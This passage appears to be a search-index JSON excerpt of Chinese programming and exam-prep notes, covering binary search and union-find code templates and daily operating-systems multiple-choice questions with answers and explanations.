mid=low+(high-low)/2;//\u9632\u6b62\u6ea2\u51fa\u95ee\u9898 if(array[mid]>target) high=mid-1; else if(array[mid]<target) low=mid+1; else return mid; } return-1; } 2. STL # lower_bound(\u8d77\u59cb\u5730\u5740\uff0c\u7ed3\u675f\u5730\u5740\uff0c\u8981\u67e5\u627e\u7684\u6570\u503c) \u8fd4\u56de\u7684\u662f \u7b2c\u4e00\u4e2a\u5927\u4e8e\u6216\u7b49\u4e8e \u8981\u67e5\u627e\u7684\u6570\u503c\u7684\u6570\u51fa\u73b0\u7684\u4f4d\u7f6e\u3002 upper_bound(\u8d77\u59cb\u5730\u5740\uff0c\u7ed3\u675f\u5730\u5740\uff0c\u8981\u67e5\u627e\u7684\u6570\u503c) \u8fd4\u56de\u7684\u662f\u6570\u503c \u7b2c\u4e00\u4e2a\u5927\u4e8e/\u6700\u540e\u4e00\u4e2a\u7b49\u4e8e \u8981\u67e5\u627e\u7684\u6570\u503c\u7684\u6570\u51fa\u73b0\u7684\u4f4d\u7f6e\u3002 binary_search(\u8d77\u59cb\u5730\u5740\uff0c\u7ed3\u675f\u5730\u5740\uff0c\u8981\u67e5\u627e\u7684\u6570\u503c) \u8fd4\u56de\u7684\u662f \u662f\u5426\u5b58\u5728 \u8fd9\u4e48\u4e00\u4e2a\u6570\uff0c\u662f\u4e00\u4e2a bool\u503c \u3002 3. \u9898\u76ee # \u4e8c\u5206\u67e5\u627e\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"1.\u4e8c\u5206\u67e5\u627e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%9F%A5%E6%89%BE/1.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/#_1","text":"","title":"\u4e8c\u5206\u67e5\u627e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%9F%A5%E6%89%BE/1.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/#_2","text":"\u4e8c\u5206\u67e5\u627e \u76ee\u5f55 1. \u6a21\u677f 2. STL 3. \u9898\u76ee","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%9F%A5%E6%89%BE/1.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/#1","text":"int binary_search(int array[],int low,int high,int target) { while(low<=high) { int mid=low+(high-low)/2;//\u9632\u6b62\u6ea2\u51fa\u95ee\u9898 if(array[mid]>target) high=mid-1; else if(array[mid]<target) low=mid+1; else return mid; } return-1; }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%9F%A5%E6%89%BE/1.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/#2-stl","text":"lower_bound(\u8d77\u59cb\u5730\u5740\uff0c\u7ed3\u675f\u5730\u5740\uff0c\u8981\u67e5\u627e\u7684\u6570\u503c) \u8fd4\u56de\u7684\u662f \u7b2c\u4e00\u4e2a\u5927\u4e8e\u6216\u7b49\u4e8e \u8981\u67e5\u627e\u7684\u6570\u503c\u7684\u6570\u51fa\u73b0\u7684\u4f4d\u7f6e\u3002 upper_bound(\u8d77\u59cb\u5730\u5740\uff0c\u7ed3\u675f\u5730\u5740\uff0c\u8981\u67e5\u627e\u7684\u6570\u503c) \u8fd4\u56de\u7684\u662f\u6570\u503c \u7b2c\u4e00\u4e2a\u5927\u4e8e/\u6700\u540e\u4e00\u4e2a\u7b49\u4e8e \u8981\u67e5\u627e\u7684\u6570\u503c\u7684\u6570\u51fa\u73b0\u7684\u4f4d\u7f6e\u3002 binary_search(\u8d77\u59cb\u5730\u5740\uff0c\u7ed3\u675f\u5730\u5740\uff0c\u8981\u67e5\u627e\u7684\u6570\u503c) \u8fd4\u56de\u7684\u662f \u662f\u5426\u5b58\u5728 \u8fd9\u4e48\u4e00\u4e2a\u6570\uff0c\u662f\u4e00\u4e2a bool\u503c \u3002","title":"2. STL"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%9F%A5%E6%89%BE/1.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/#3","text":"\u4e8c\u5206\u67e5\u627e\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"3. \u9898\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/1.%E5%B9%B6%E6%9F%A5%E9%9B%86/","text":"\u5f52\u5e76\u6392\u5e8f # \u76ee\u5f55 # \u5f52\u5e76\u6392\u5e8f \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee 1. \u6a21\u677f # #include <iostream> #include <string.h> using namespace std; const int num = 5e4 + 1; int group[num]; int height[num]; // \u521d\u59cb\u5316 void init_set() { for (int i = 1; i < num; i++) { group[i] = i; // \u6811\u7684\u9ad8\u5ea6 height[i] = 0; } } // \u67e5\u627e int find_set(int x) { // \u8def\u5f84\u538b\u7f29 if (x != group[x]) { group[x] = find_set(group[x]); } return group[x]; } void union_set(int x, int y) { x = find_set(x); y = find_set(y); // \u7b80\u6613\u505a\u6cd5 // if (x != y) // { // group[x] = group[y]; // } // \u5408\u5e76\u4f18\u5316\u505a\u6cd5 if (height[x] == height[y]) { // \u5408\u5e76\uff0c\u6811\u7684\u9ad8\u5ea6\u52a01 height[x] = height[x] + 1; group[y] = x; } else { // \u77ee\u6811\u5408\u5e76\u5230\u9ad8\u6811\u4e0a\uff0c\u9ad8\u6811\u7684\u9ad8\u5ea6\u4fdd\u6301\u4e0d\u53d8 if (height[x] < height[y]) { group[x] = y; }else{ group[y] = x; } } } 2. \u9898\u76ee # \u5e76\u67e5\u96c6\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"1.\u5e76\u67e5\u96c6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/1.%E5%B9%B6%E6%9F%A5%E9%9B%86/#_1","text":"","title":"\u5f52\u5e76\u6392\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/1.%E5%B9%B6%E6%9F%A5%E9%9B%86/#_2","text":"\u5f52\u5e76\u6392\u5e8f \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/1.%E5%B9%B6%E6%9F%A5%E9%9B%86/#1","text":"#include <iostream> #include <string.h> using namespace std; const int num = 5e4 + 1; int group[num]; int height[num]; // \u521d\u59cb\u5316 void init_set() { for (int i = 1; i < num; i++) { group[i] = i; // \u6811\u7684\u9ad8\u5ea6 height[i] = 0; } } // \u67e5\u627e int find_set(int x) { // \u8def\u5f84\u538b\u7f29 if (x != group[x]) { group[x] = find_set(group[x]); } return group[x]; } void union_set(int x, int y) { x = find_set(x); y = find_set(y); // \u7b80\u6613\u505a\u6cd5 // if (x != y) // { // group[x] = group[y]; // } // \u5408\u5e76\u4f18\u5316\u505a\u6cd5 if (height[x] == height[y]) { // \u5408\u5e76\uff0c\u6811\u7684\u9ad8\u5ea6\u52a01 height[x] = height[x] + 1; group[y] = x; } else { // \u77ee\u6811\u5408\u5e76\u5230\u9ad8\u6811\u4e0a\uff0c\u9ad8\u6811\u7684\u9ad8\u5ea6\u4fdd\u6301\u4e0d\u53d8 if (height[x] < height[y]) { group[x] = y; }else{ group[y] = x; } } }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/1.%E5%B9%B6%E6%9F%A5%E9%9B%86/#2","text":"\u5e76\u67e5\u96c6\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"2. \u9898\u76ee"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue 1. Week 1 # 1.1. Mon # \u6d89\u53ca\u67d0\u4e00\u8d44\u6e90\u9020\u6210\u4e0e\u65f6\u95f4\u6709\u5173\u7684\u9519\u8bef\u7684\u539f\u56e0\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u5357\u4eac\u7406\u5de5\u5927\u5b66\uff3d A\uff0e\u4e00\u4e2a\u8fdb\u7a0b\u591a\u6b21\u7533\u8bf7\uff0c\u91ca\u653e\u8be5\u8d44\u6e90 B\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90 C\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u4f7f\u7528\u8be5\u8d44\u6e90 D\uff0e\u4ee5\u4e0a\u8bf4\u6cd5\u5747\u4e0d\u5bf9 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4e00\u4e2a\u8fdb\u7a0b\u4e0d\u53ef\u80fd\u5f15\u8d77\u6b7b\u9501\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u7684\u4f7f\u7528\u8d44\u6e90\uff0c\u7cfb\u7edf\u4f1a\u91c7\u7528P\uff0cV\u64cd\u4f5c\u5bf9\u8d44\u6e90\u8fdb\u884c\u7ba1\u7406\uff0c\u56e0\u6b64\u4e5f\u4e0d\u4f1a\u5f15\u8d77\u6b7b\u9501\uff0c\u5bf9B\u9009\u9879\uff0c\u82e5\u4e0d\u52a0\u9650\u5236\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90\uff0c\u800c\u8d44\u6e90\u6709\u9650\u65f6\uff0c\u6709\u53ef\u80fd\u4f1a\u9020\u6210\u6b7b\u9501\u3002 1.2. Tue # \u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u5c5e\u4e8e\u591a\u7ea7\u9875\u8868\u4f18\u70b9\u7684\u662f \u3002\uff3b\u5357\u4eac\u5927\u5b66\uff3d A\uff0e\u52a0\u5feb\u5730\u5740\u53d8\u6362\u901f\u5ea6 B\uff0e\u51cf\u5c11\u7f3a\u9875\u4e2d\u65ad\u6b21\u6570 C\uff0e\u51cf\u5c11\u9875\u8868\u9879\u6240\u5360\u5b57\u8282\u6570 D\uff0e\u51cf\u5c11\u9875\u8868\u6240\u5360\u7684\u8fde\u7eed\u5185\u5b58\u7a7a\u95f4 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u591a\u7ea7\u9875\u8868\u662f\u57fa\u4e8e\u865a\u62df\u5730\u5740\u7684\u5206\u6bb5\u6765\u5212\u5206\u7b49\u7ea7\u7684\uff0c\u6700\u4f4e\u7b49\u7ea7\u7684\u9875\u8868\u4e0a\u4fdd\u5b58\u4e86\u6700\u7ec8\u7684\u865a\u62df\u9875\u53f7\u548c\u7269\u7406\u9875\u53f7\u7684\u5bf9\u5e94\u5173\u7cfb\u3002\u4f8b\u5982\u62ff32\u4f4d\u7684\u865a\u62df\u5730\u5740\u6765\u8bf4\uff0c\u5982\u679c\u9875\u9762\u7684\u5927\u5c0f\u4e3a4K\uff0c\u4e5f\u5c31\u662f12\u4f4d\uff0c\u90a3\u4e48\u5730\u5740\u7a7a\u95f4\u5185\u5c06\u670920\u4f4d\uff0c\u4e5f\u5c31\u662f1M\u7684\u9875\u8868\u9879\u76ee\uff0c\u6bcf\u4e2a\u9879\u76ee\u5bf9\u5e94\u4e00\u4e2a\u865a\u62df\u9875\u9762\u3002\u90a3\u4e48\u5bf9\u4e8e\u5730\u5740\u7a7a\u95f4\u4e2d\u7528\u4e8e\u8868\u793a\u9875\u53f7\u768420\u4f4d\u5730\u5740\u518d\u6b21\u5206\u7ea7\uff0c\u5206\u621010\u4f4d\u7684\u4e00\u7ea7\u9875\u53f7\u548c10\u4f4d\u7684\u4e8c\u7ea7\u9875\u53f7\u5462\u3002\u5c31\u662f\u8bf4\u6839\u636e\u4e00\u7ea7\u9875\u53f7\u53ef\u4ee5\u77e5\u90531K\u4e2a\u8fde\u7eed\u7684\u9875\u9762\u4e2d\u662f\u5426\u5df2\u7ecf\u6709\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u6216\u8005\u88ab\u7f6e\u6362\u5230\u4ea4\u6362\u7a7a\u95f4\u4e2d\u7684\uff0c\u5982\u679c\u4e00\u7ea7\u9875\u8868\u4e2d\u8fd91K\u4e2a\u9875\u9762\u6ca1\u6709\u4efb\u610f\u4e00\u4e2a\u9875\u9762\u88ab\u52a0\u8f7d\u6216\u8005\u7f6e\u6362\u8fc7\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u5728\u4e3a\u8fd91K\u4e2a\u9875\u9762\u7ef4\u62a42\u7ea7\u9875\u8868\u4e86\u3002 \u7406\u8bba\u4e0a\u6765\u8bf4\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u5f00\u59cb\u8fd0\u884c\u7684\u65f6\u5019\u53ea\u9700\u89813\u4e2a1K\u7684\u9875\u9762\u5c31\u53ef\u4ee5\u8fd0\u884c\u4e86\uff0c\u5373\u4e00K\u7684\u4ee3\u7801\u6bb5\u9875\u9762\uff0c\u4e00K\u7684\u6570\u636e\u6bb5\u9875\u9762\u548c\u4e00K\u7684\u685f\u9875\u9762\u3002\u56e0\u6b64\uff0c\u53ea\u9700\u89811K\u4e2a\u4e00\u7ea7\u9875\u8868\u5355\u5143\u4e00\u7ea73K\u4e2a\u4e8c\u7ea7\u9875\u8868\u5355\u5143\u5373\u53ef\uff0c\u8fdc\u8fdc\u5c0f\u4e8e\u8fde\u7eed\u9875\u9762\u7c7b\u578b\u7684\u9875\u8868\u9700\u8981\u76841M\u7684\u9875\u8868\u5355\u5143\uff0c\u6545\u51cf\u5c11\u4e86\u6240\u9700\u5360\u7684\u8fde\u7eed\u5185\u5b58\u7a7a\u95f4\uff0cD\u6b63\u786e\u3002 \u6b64\u5916\uff0c\u7531\u4e8e\u591a\u6b21\u8bbf\u5b58\uff0c\u591a\u7ea7\u9875\u8868\u4f1a\u51cf\u6162\u5730\u5740\u8f6c\u6362\u901f\u5ea6\uff0cA\u9519\u8bef\u3002 1.3. Wed # \u5047\u8bbe\u78c1\u5934\u5f53\u524d\u4f4d\u4e8e\u7b2c105\u9053\uff0c\u6b63\u5728\u5411\u78c1\u9053\u5e8f\u53f7\u589e\u52a0\u7684\u65b9\u5411\u79fb\u52a8\u3002\u73b0\u6709\u4e00\u4e2a\u78c1\u9053\u8bbf\u95ee\u8bf7\u6c42\u5e8f\u5217\u4e3a35\uff0c45\uff0c12\uff0c68\uff0c110\uff0c180\uff0c170\uff0c195\uff0c\u91c7\u7528SCAN\u8c03\u5ea6(\u7535\u68af\u8c03\u5ea6)\u7b97\u6cd5\u5f97\u5230\u7684\u78c1\u9053\u8bbf\u95ee\u5e8f\u5217\u662f \uff3b\u5409\u6797\u5927\u5b66\uff3d A\uff0e110\uff0c170\uff0c180\uff0c195\uff0c68\uff0c45\uff0c35\uff0c12 B\uff0e110\uff0c68\uff0c45\uff0c35\uff0c12\uff0c170\uff0c180\uff0c195 C\uff0e110\uff0c170\uff0c180\uff0c195\uff0c12\uff0c35\uff0c45\uff0c68 D\uff0e12\uff0c35\uff0c45\uff0c68\uff0c110\uff0c170\uff0c180\uff0c195 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u672c\u9898\u8003\u67e5\u78c1\u9053\u8c03\u5ea6\u7b97\u6cd5\u3002SCAN\u8c03\u5ea6\u7b97\u6cd5\u5728\u78c1\u5934\u5f53\u524d\u79fb\u52a8\u65b9\u5411\u4e0a\u9009\u62e9\u4e0e\u5f53\u524d\u78c1\u5934\u6240\u5728\u78c1\u9053\u8ddd\u79bb\u6700\u8fd1\u7684\u8bf7\u6c42\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u670d\u52a1\u5bf9\u8c61\u3002\u5f53\u524d\u78c1\u9053\u5411\u5e8f\u53f7\u589e\u52a0\u7684\u65b9\u5411\u79fb\u52a8\uff0c\u5f53\u524d\u4f4d\u4e8e\u7b2c105\u9053\uff0c\u5219\u8ddd\u79bb\u6700\u8fd1\u7684\u4e0b\u4e00\u4e2a\u5e94\u8be5\u662f\u7b2c110\u78c1\u9053\uff0c\u4f9d\u6b21\u9012\u589e\u5230\u6700\u9ad8195\uff0c\u518d\u5411\u5e8f\u53f7\u51cf\u5c11\u7684\u65b9\u5411\u79fb\u52a8\uff0c\u79bb\u5f53\u524d195\u78c1\u9053\u6700\u8fd1\u7684\u662f68\u53f7\u78c1\u9053\uff0c\u4f9d\u6b21\u9012\u589e\u5230\u6240\u6709\u7684\u8bf7\u6c42\u5b8c\u6210\uff0c\u6240\u4ee5\u78c1\u9053\u8bbf\u95ee\u5e8f\u5217\u4e3a110\uff0c170\uff0c180\uff0c195\uff0c68\uff0c45\uff0c35\uff0c12\u3002 1.4. Thu # \u8bbe\u7f6e\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u7684\u4e3b\u8981\u76ee\u7684\u662f \uff3b\u5409\u6797\u5927\u5b66\uff3d A. \u8282\u7701\u5916\u5b58\u7a7a\u95f4 B. \u8282\u7701\u5185\u5b58\u7a7a\u95f4 C. \u52a0\u5feb\u6587\u4ef6\u7684\u68c0\u7d22\u901f\u5ea6 D. \u52a0\u5feb\u6587\u4ef6\u7684\u8bfb/\u5199\u901f\u5ea6 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u7edd\u5bf9\u8def\u5f84\u540d(\u5168\u8def\u5f84\u540d)\uff1a\u4ece\u6839\u76ee\u5f55\u5f00\u59cb\u5230\u8fbe\u6240\u8981\u67e5\u627e\u6587\u4ef6\u7684\u8def\u5f84\u3002\u9664\u4e86\u7edd\u5bf9\u8def\u5f84\u540d\u4ee5\u5916\uff0c\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u7528\u6237\u8bbe\u7f6e\u4e00\u4e2a\u5f53\u524d\u76ee\u5f55(\u53c8\u79f0\u5de5\u4f5c\u76ee\u5f55)\uff0c\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u5c31\u4ece\u5f53\u524d\u76ee\u5f55\u5f00\u59cb\u5411\u4e0b\u987a\u6b21\u68c0\u7d22\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u8bbe\u7f6e\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u7684\u4e3b\u8981\u76ee\u7684\u662f\u52a0\u5feb\u6587\u4ef6\u7684\u68c0\u7d22\u901f\u5ea6\u3002\u8282\u7701\u5916\u5b58\u7a7a\u95f4\uff0c\u8282\u7701\u5185\u5bb9\u7a7a\u95f4\uff0c\u52a0\u5feb\u6587\u4ef6\u7684\u8bfb\u5199\u901f\u5ea6\u90fd\u4e0e\u8bbe\u7f6e\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u65e0\u5173\u3002 1.5. Fri # \u5df2\u77e5\u67d0\u8ba1\u7b97\u673a\u7cfb\u7edf\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u91c7\u7528\u786c\u4ef6\u652f\u6301\u7684\u4e8c\u7ea7\u9875\u8868\uff0c\u9875\u8868\u9879\u4f4d64bit\uff0c\u9875\u9762\u5927\u5c0f\u4e3a4KB\uff0c\u5047\u8bbe\u7a0b\u5e8f\u8fde\u7eed\u8bbf\u95ee\u957f\u5ea6\u4e3a1MB \u7684\u6570\u7ec4\u4e14\u8fc7\u7a0b\u4e2d\u672a\u53d1\u751f\u4e2d\u65ad\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6700\u591a\u4f1a\u8bbf\u95ee\u591a\u5c11\u6b21\u5185\u5b58\u4e2d\u7684\u9875\u8868\uff1f\uff3b\u4e2d\u56fd\u79d1\u5b66\u9662863-2018\uff3d A. 128 B. 256 C. 512 D. 1024 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a1MB/4KB=256\u9875\uff0c\u4e00\u9875\u53ef\u4ee5\u5305\u542b4KB/8B=512\u9875\u8868\u9879\uff0c\u6240\u4ee5256\u9875\u9700\u8981\u4e00\u4e2a\u4e8c\u7ea7\u9875\u8868\u5c31\u591f\u4e86\u3002\u8bbf\u95ee256\u6b21\uff0c\u6bcf\u6b21\u8bbf\u95ee\u4e24\u7ea7\u9875\u8868\uff0c256*2=512\u6b21\u9875\u8868\u3002 2. Week 2 # 2.1. Sat # \u67d0\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u67098 \u53f0\u6253\u5370\u673a\uff0c\u7531K \u4e2a\u8fdb\u7a0b\u7ade\u4e89\u4f7f\u7528\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6700\u591a\u9700\u89813 \u53f0\u6253\u5370\u673a\u3002\u8be5\u7cfb\u7edf\u53ef\u80fd\u4f1a\u53d1\u751f\u6b7b\u9501\u7684K \u7684\u6700\u5c0f\u503c\u662f______\u3002\uff3b\u4e2d\u56fd\u79d1\u5b66\u9662863\uff3d A. 2 B. 3 C. 4 D. 5 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5bf9\u4e8e\u4e09\u4e2a\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u6709\u4e24\u4e2a\u8fdb\u7a0b\u5206\u522b\u83b7\u5f973\u53f0\uff0c\u4f7f\u5176\u6267\u884c\u5b8c\u91ca\u653e\u540e\u8ba9\u7b2c\u4e09\u4e2a\u8fdb\u7a0b\u83b7\u5f973\u53f0\uff0c\u4e0d\u4f1a\u4ea7\u751f\u6b7b\u9501\uff1b\u5bf9\u4e8e\u56db\u4e2a\u8fdb\u7a0b\uff0c\u5047\u82e5\u6bcf\u4e2a\u8fdb\u7a0b\u5404\u83b7\u5f972\u53f0\u800c\u540c\u65f6\u9700\u8981\u53e6\u5916\u4e00\u53f0\uff0c\u8fd9\u5c31\u4f1a\u4ea7\u751f\u6b7b\u9501\uff0c\u6240\u4ee5\u4ea7\u751f\u6b7b\u9501\u7684\u6700\u5c0f\u503c\u662f4\u3002 \u3010\u603b\u7ed3\u9898\u578b\u3011\uff1a\u5047\u8bbe\u73b0\u5728\u6709 P \u4e2a\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6700\u591a\u9700\u8981 m \u4e2a\u8d44\u6e90\uff0c\u5e76\u4e14\u6709 r \u4e2a\u8d44\u6e90\u53ef\u7528\u3002\u4ec0\u4e48\u6837\u7684\u6761\u4ef6\u53ef\u4ee5\u4fdd\u8bc1\u6b7b\u9501\u4e0d\u4f1a\u53d1\u751f\uff1f \u89e3\uff1a\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u6709 m \u4e2a\u8d44\u6e90\u5b83\u5c31\u80fd\u591f\u7ed3\u675f\uff0c\u4e0d\u4f1a\u4f7f\u81ea\u5df1\u9677\u5165\u6b7b\u9501\u4e2d\u3002\u56e0\u6b64\u6700\u5dee\u60c5\u51b5\u662f\u6bcf\u4e2a\u8fdb\u7a0b\u6709 m-1 \u4e2a\u8d44\u6e90\u5e76\u4e14\u9700\u8981\u53e6\u5916\u4e00\u4e2a\u8d44\u6e90\u3002\u5982\u679c\u7559\u4e0b\u6709\u4e00\u4e2a\u8d44\u6e90\u53ef\u7528\uff0c\u90a3\u4e48\u5176\u4e2d\u67d0\u4e2a\u8fdb\u7a0b\u5c31\u80fd\u591f\u7ed3\u675f\u5e76\u91ca\u653e\u5b83\u7684\u6240\u6709\u8d44\u6e90\uff0e\u4f7f\u5176\u5b83\u8fdb\u7a0b\u4e5f\u80fd\u591f\u7ed3\u675f\u3002\u6240\u4ee5\u907f\u514d\u6b7b\u9501\u7684\u6761\u4ef6\u662f\uff1a r \\le p(m-1)+1 \u7531\u6b64\u6761\u4ef6\u89e3\u4e0a\u9898\uff1a r=8\uff0cm=3 \uff0c\u5e26\u5165\u516c\u5f0f\u5f97\uff1a 2p \\le 7 \u3002\u5373\u5f53P\u5c0f\u4e8e\u7b49\u4e8e3\u65f6\u624d\u53ef\u4fdd\u8bc1\u6b7b\u9501\u4e0d\u4f1a\u53d1\u751f\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u4ea7\u751f\u6b7b\u9501\u7684\u6700\u5c0f\u503c\u662f4\u3002 2.2. Sun # \u7528\u6237\u7a0b\u5e8f\u53d1\u51fa\u78c1\u76d8I/O \u8bf7\u6c42\u540e\uff0c\u7cfb\u7edf\u7684\u5904\u7406\u6d41\u7a0b\u662f\uff1a\u7528\u6237\u7a0b\u5e8f\u2192\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\u2192\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u2192\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002\u5176\u4e2d\uff0c\u8ba1\u7b97\u6570\u636e\u6240\u5728\u78c1\u76d8\u7684\u67f1\u9762\u53f7\u3001\u78c1\u5934\u53f7\u3001\u6247\u533a\u53f7\u7684\u7a0b\u5e8f\u662f \uff3b\u4e2d\u56fd\u79d1\u5b66\u9662863\uff3d A\uff0e\u7528\u6237\u7a0b\u5e8f B\uff0e\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f C\uff0e\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f D\uff0e\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u8ba1\u7b97\u78c1\u76d8\u53f7\u3001\u78c1\u5934\u53f7\u548c\u6247\u533a\u53f7\u7684\u5de5\u4f5c\u662f\u7531\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u5b8c\u6210\u7684\uff0c\u7b54\u6848\u9009C\u3002 3. Week 3 # 3.1. Mon # \u8f6e\u8f6c\u6cd5\u8fdb\u7a0b\u8c03\u5ea6\u4e2d\uff0c\u5982\u679c\u65f6\u95f4\u7247\u957f\u5ea6\u4e00\u5b9a\uff0c\u5219 \uff0c\u54cd\u5e94\u65f6\u95f4\u8d8a\u77ed\uff3b\u4e91\u5357\u5927\u5b66831\uff3d A\uff0e\u8fdb\u7a0b\u7b49\u5f85\u65f6\u95f4\u8d8a\u957f B\uff0e\u5c31\u7eea\u961f\u5217\u4e2d\u8fdb\u7a0b\u6570\u8d8a\u5c11 C\uff0e\u8fdb\u7a0b\u8981\u6c42\u8fd0\u884c\u65f6\u95f4\u8d8a\u77ed D\uff0e\u5185\u5b58\u8d8a\u5c0f \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u54cd\u5e94\u65f6\u95f4\u4e3b\u8981\u7531\u65f6\u95f4\u7247\u5927\u5c0f\uff0c\u5c31\u7eea\u961f\u5217\u7b49\u5f85\u6570\u76ee\u4e24\u4e2a\u56e0\u7d20\u51b3\u5b9a\uff0c\u7b54\u6848\u9009B\u3002 3.2. Tue # \u5728\u53ef\u5265\u593a\u65b9\u5f0f\u4e0b\u5f15\u8d77\u8c03\u5ea6\u7684\u539f\u56e0\u662f \uff3b\u4e91\u5357\u5927\u5b66831\uff3d A.\u5728\u5206\u65f6\u7cfb\u7edf\u4e2d\u65f6\u95f4\u7247\u5df2\u7528\u5b8c B.\u6267\u884c\u4e2d\u7684\u8fdb\u7a0b\u8c03\u7528\u4e86P\u539f\u8bed\u64cd\u4f5c\u3002 